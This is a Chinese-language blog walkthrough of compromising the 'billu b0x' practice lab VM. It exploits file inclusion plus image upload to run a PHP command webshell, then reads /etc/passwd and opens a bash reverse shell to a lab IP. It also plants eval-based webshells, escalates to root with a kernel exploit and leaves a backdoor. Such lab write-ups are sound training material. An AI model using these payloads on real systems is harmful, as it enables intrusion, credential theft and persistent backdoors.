+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'c.php'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'head2.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(@$_SESSION[<span class="string">'logged'</span>]!=<span class="keyword">true</span> )</span><br><span class="line">&#123;</span><br><span class="line">		header(<span class="string">'Location: index.php'</span>, <span class="keyword">true</span>, <span class="number">302</span>);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Welcome to billu b0x "</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">    &lt;form method=post style="margin: 10px 0px 10px 95%;"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=submit name=lg value=Logout&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;'</span>;    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'lg'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">unset</span>($_SESSION[<span class="string">'logged'</span>]);</span><br><span class="line">    	<span class="keyword">unset</span>($_SESSION[<span class="string">'admin'</span>]);</span><br><span class="line">    	header(<span class="string">'Location: index.php'</span>, <span class="keyword">true</span>, <span class="number">302</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">                &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">                    &lt;select name=load&gt;</span></span><br><span class="line"><span class="string">                        &lt;option value="show"&gt;Show Users&lt;/option&gt;</span></span><br><span class="line"><span class="string">                        &lt;option value="add"&gt;Add User&lt;/option&gt;</span></span><br><span class="line"><span class="string">                    &lt;/select&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     &amp;nbsp</span></span><br><span class="line"><span class="string">                    &lt;input type=submit name=continue value="continue"&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'continue'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    	$dir=getcwd();</span><br><span class="line">    	$choice=str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$_POST[<span class="string">'load'</span>]);</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">if</span>($choice===<span class="string">'add'</span>)</span><br><span class="line">    	&#123;</span><br><span class="line">           		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line">    			<span class="keyword">die</span>();</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">            <span class="keyword">if</span>($choice===<span class="string">'show'</span>)</span><br><span class="line">    	&#123;</span><br><span class="line">            </span><br><span class="line">    		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line">    		<span class="keyword">die</span>();</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">include</span>($dir.<span class="string">'/'</span>.$_POST[<span class="string">'load'</span>]);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    	</span><br><span class="line">    	$name=mysqli_real_escape_string($conn,$_POST[<span class="string">'name'</span>]);</span><br><span class="line">   	$address=mysqli_real_escape_string($conn,$_POST[<span class="string">'address'</span>]);</span><br><span class="line">   	$id=mysqli_real_escape_string($conn,$_POST[<span class="string">'id'</span>]);</span><br><span class="line">    	</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]))</span><br><span class="line">    	&#123;</span><br><span class="line">    	$iname=mysqli_real_escape_string($conn,$_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    	$r=pathinfo($_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>],PATHINFO_EXTENSION);</span><br><span class="line">    	$image=<span class="keyword">array</span>(<span class="string">'jpeg'</span>,<span class="string">'jpg'</span>,<span class="string">'gif'</span>,<span class="string">'png'</span>);</span><br><span class="line">    	<span class="keyword">if</span>(in_array($r,$image))</span><br><span class="line">    	&#123;</span><br><span class="line">    		$finfo = @<span class="keyword">new</span> finfo(FILEINFO_MIME); </span><br><span class="line">    		$filetype = @$finfo-&gt;file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">    		<span class="keyword">if</span>(preg_match(<span class="string">'/image\/jpeg/'</span>,$filetype )  || preg_match(<span class="string">'/image\/png/'</span>,$filetype ) || preg_match(<span class="string">'/image\/gif/'</span>,$filetype ))</span><br><span class="line">    				&#123;</span><br><span class="line">    					<span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>], <span class="string">'uploaded_images/'</span>.$_FILES[<span class="string">'image'</span>][<span class="string">'name'</span>]))</span><br><span class="line">    							 &#123;</span><br><span class="line">    							  <span class="keyword">echo</span> <span class="string">"Uploaded successfully "</span>;</span><br><span class="line">    							  $update=<span class="string">'insert into users(name,address,image,id) values(\''</span>.$name.<span class="string">'\',\''</span>.$address.<span class="string">'\',\''</span>.$iname.<span class="string">'\', \''</span>.$id.<span class="string">'\')'</span>; </span><br><span class="line">    							 mysqli_query($conn, $update);</span><br><span class="line">    							  </span><br><span class="line">    							&#125;</span><br><span class="line">    				&#125;</span><br><span class="line">    			<span class="keyword">else</span></span><br><span class="line">    			&#123;</span><br><span class="line">    				<span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                            &lt;br&gt;i told you dear, only png,jpg and gif file are allowed"</span>;</span><br><span class="line">    			&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                                &lt;br&gt;only png,jpg and gif file are allowed"</span>;</span><br><span class="line">    		</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">       &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以发现，它限制了文件上传的类型，只能上传文件后缀为’jpeg’,’jpg’,’gif’,’png’的文件。并且它存在文件包含漏洞，所以利用上传漏洞和文件包含漏洞就可以往服务器植马</p>
+<p>随便找张图片，用记事本打开，将一句话木马加到文件最下面</p>
+<p><img src="/picture/1543293020109.png" alt="1543293020109"></p>
+<p>然后上传到服务器上，但是我好像遇到了点小问题……它死活都不让我上传………我去网上查了下大佬写的攻略，发现就是这么构造的啊…..日常非洲人</p>
+<p>昨天我又试了一遍，发现可以了……..真的是打扰了</p>
+<p>将图片上传到服务器后，利用panel页面的文件包含漏洞去执行cmd马</p>
+<blockquote>
+<p>&lt;?php system($_GET[‘cmd’]); ?&gt;</p>
+</blockquote>
+<p>测试一下，执行命令 cmd=cat%20/etc/passwd</p>
+<p><img src="/picture/1545179706897.png" alt="1545179706897"></p>
+<p>可以发现命令成功执行了，然后利用反弹shell，向服务器中写入菜刀马</p>
+<p>反弹shell命令,注意这个要进行url编码</p>
+<blockquote>
+<p>echo “bash -i &gt;&amp; /dev/tcp/192.168.133.154/4444 0&gt;&amp;1” | bash</p>
+</blockquote>
+<p>获取了反弹shell</p>
+<p><img src="/picture/1545180281797.png" alt="1545180281797"></p>
+<p>写入菜刀马，方便之后传文件，用蚁剑连接</p>
+<blockquote>
+<p>echo ‘&lt;?php eval($_POST[‘zs0zrc’]);?&gt;’ &gt;&gt;1.php</p>
+</blockquote>
+<p><img src="/picture/1545182108024.png" alt="1545182108024"></p>
+<p>查看系统版本以及内核信息</p>
+<blockquote>
+<p>cat /etc/issue</p>
+<p>uname -a</p>
+</blockquote>
+<p><img src="/picture/1545181369534.png" alt="1545181369534"></p>
+<p>然后搜索exp，google搜关键词   Ubuntu 12.04.5 e</p>
+<p><img src="/picture/1545181410560.png" alt="1545181410560"></p>
+<p>第一个就可以用了，将exp上传到服务器上，gcc编译，然后执行，权限就提升到root了</p>
+<p><img src="/picture/1545181280667.png" alt="1545181280667"></p>
+<p>有了root权限后，将/etc/passwd 和 /etc/shadow文件读取出来。然后可以暴力破解root用户密码</p>
+<p>这一步我就没有做了</p>
+<p>重启大法走一波，额额额 ，还是不行，不理了，直接root登陆在phpmy文件夹下留个一句话木马</p>
+<blockquote>
+<p>&lt;?php eval($_POST[‘ant’]); ?&gt;</p>
+</blockquote>
+<p>然后用蚁剑链接</p>
+<p><img src="/picture/1543295522480.png" alt="1543295522480"></p>
+<p>就留了个后门<br>这个靶场的渗透测试就完成了。这是一个比较基础的，适合新手的靶场，还是挺有意思的。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/20/2018-11-20-2018-高校网络信息安全管理运维挑战赛-pwn-writeup/" rel="next" title="2018-高校网络信息安全管理运维挑战赛-pwn-writeup">
+                <i class="fa fa-chevron-left"></i> 2018-高校网络信息安全管理运维挑战赛-pwn-writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
+            
+              <p class="site-author-name" itemprop="name">zs0zrc</p>
+              <p class="site-description motion-element" itemprop="description">zs0zrc's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://myhackerworld.top/" title="D4rk3r" target="_blank">D4rk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://m4x.fun/" title="M4X" target="_blank">M4X</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#靶机"><span class="nav-number">1.</span> <span class="nav-text">靶机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标"><span class="nav-number">2.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具"><span class="nav-number">3.</span> <span class="nav-text">工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#收集信息"><span class="nav-number">4.</span> <span class="nav-text">收集信息</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'kXIhCtwOU5AsdKEH7mjI1f2k-gzGzoHsz',
+        appKey: 'uYeHUkgtbToPh4mGzE7YJXNe',
+        placeholder: 'pwn pwn pwn',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
